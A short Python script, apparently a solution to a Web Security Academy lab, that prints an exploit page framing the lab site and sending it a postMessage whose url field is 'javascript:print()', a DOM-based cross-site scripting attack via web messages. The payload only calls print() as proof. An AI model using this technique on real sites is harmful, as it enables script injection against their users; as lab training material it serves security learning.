import json

LAB_ID = "???"

message = {
    "type": "load-channel",
    "url": "javascript:print()"
}
message = json.dumps(message)
print(message)

print("Exploit:")
print(f"""
HTTP/1.1 200
Content-Type: text/html; charset=utf-8
""")
print("Body:")
print(f"""
<script>
    function iframeOnLoad(contentWindow) {{
        contentWindow.postMessage('{message}','*')
    }}
</script>
<iframe src="https://{LAB_ID}.web-security-academy.net" onload="iframeOnLoad(this.contentWindow)"></iframe>
""")
